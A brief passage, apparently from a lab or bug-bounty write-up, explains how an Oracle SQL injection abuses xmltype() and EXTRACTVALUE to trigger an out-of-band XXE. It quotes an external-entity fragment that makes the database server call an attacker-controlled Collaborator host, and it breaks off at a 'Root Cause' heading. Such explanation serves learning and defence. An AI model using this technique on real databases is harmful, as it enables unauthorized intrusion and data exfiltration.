...
- By passing a crafted XML string into `xmltype()`, we trigger an XML External Entity (XXE) vulnerability within the database engine itself. The `<!ENTITY % remote SYSTEM "http://...">` definition forces the database server to initiate an outbound DNS/HTTP request to our Collaborator server to resolve the external entity. `EXTRACTVALUE` is simply used to execute the `xmltype` function.
## Root Cause
